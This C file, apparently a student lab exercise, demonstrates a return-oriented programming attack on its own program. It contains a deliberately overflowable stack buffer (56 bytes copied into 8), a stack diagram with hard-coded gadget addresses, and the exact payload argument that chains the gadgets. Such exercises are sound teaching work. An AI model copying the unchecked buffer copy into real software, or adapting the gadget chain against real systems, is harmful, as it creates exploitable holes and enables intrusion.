/**
 * Author: Nalam V S S Krishna Chaitanya,
 * Details: CS13B021, IIT Madras.
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/**
 * This file prints the value in the variable rop by doing a rop
 * attack. This uses the code snippet "mov 48(%rax), %rax;" which moves a value
 * from memory to address. Then prints the value in %rax in a round about manner
 * by moving to and fro from %rdx register.
 */

// The variable whose value will be moved into register.

int rop;

// Gives the value present in the %rdx register as return lies in %rax register.

unsigned long get_rdx()
{
	asm ("mov %rdx, %rax;");
}


// The stack should look like this.
//
// |					|<-----Higher Address.
// |					|
// +--------------------+
// | 0x000000000004006d8|<-----Addr of print_rdx
// +--------------------+
// | 0x00007ffff7b1ca6f |<-----Address of instruction "mov 48(%rax), %rax;"
// +--------------------+
// | 0x000000000060102c	|<-----Value to be put into %rax(&rop - 48)
// +--------------------+
// | 0x00007ffff7a5d858 |<-----Address of instruction "pop %rax"
// +--------------------+
// |<base pointer>		|
// +--------------------+
// |<padding of buffer> |
// +--------------------+
// |<space for buffer>	|
// +--------------------+
// |					|<-----Lower Address.
// |					|

// Argument : "$(python -c 'print "A"*16+"B"*8+"\x58\xd8\xa5\xf7\xff\x7f\x20\x20"+"\x2c\x10\x60\x20\x20\x20\x20\x20"+"\x6f\xca\xb1\xf7\xff\x7f\x20\x20"+"\xd8\x06\x40\x20\x20\x20\x20\x20"')"

int main(int argc,char **argv)
{
	rop=5;
	char buffer[8];
	memcpy(buffer,argv[1],56);
	memset(buffer+30,0,2);
	memset(buffer+35,0,5);
	memset(buffer+46,0,2);
	memset(buffer+51,0,5);
}

void test()
{
	asm ("mov %rax, %rdx;");
	printf("rax is %#lx\n",get_rdx());
	exit(0);
}
